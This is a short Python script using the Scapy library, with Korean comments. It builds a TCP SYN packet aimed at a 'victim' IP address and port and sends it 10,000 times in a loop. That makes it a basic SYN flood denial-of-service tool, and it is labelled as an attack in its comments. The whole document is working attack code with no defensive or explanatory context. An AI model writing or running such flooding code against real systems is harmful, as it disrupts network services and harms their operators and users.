from scapy.all import *

# 대상 IP 주소와 포트
target_ip = "192.168.0.74" #victim Ip adress
target_port = 2000 #victim port

#물리계층별 패킷
l3 = IP(dst=target_ip)
l4 = TCP(dport=target_port, flags = "S")

# 공격 대상 패킷
target_packet = l3/l4

# 패킷을 보낼 총 횟수
total_packets = 10000
target_packet.show()

# 패킷을 보내는 함수
def send_packets():
    for i in range(total_packets):
        send(target_packet, verbose=False)

# 공격 실행
send_packets()